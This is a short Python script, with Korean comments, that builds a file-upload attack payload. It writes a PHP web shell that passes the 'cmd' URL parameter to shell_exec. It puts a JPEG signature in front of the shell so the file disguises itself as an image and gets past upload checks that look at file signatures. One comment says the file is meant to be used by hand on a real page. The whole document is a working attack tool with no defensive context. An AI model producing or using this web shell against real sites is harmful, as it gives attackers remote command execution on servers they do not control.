import io
import os

#수동으로 실제 페이지에 하기 위해 웹셸 파일 생성

webshell_content = "<?php echo shell_exec($_GET['cmd']);?>" 
jpg_sig = b'\xFF\xD8\xFF\xE1'

creat_filename = "jpg_sig_shell.php"

# jpg의 시그니처를 붙인 웹셸 파일 생성  
with open(creat_filename, "wb") as f:
  f.write(jpg_sig + webshell_content.encode('utf-8'))

#파일이 생성된 위치 화면에 출력
print(f"[+] 파일 생성 위치 ==> {os.path.abspath(creat_filename)}")
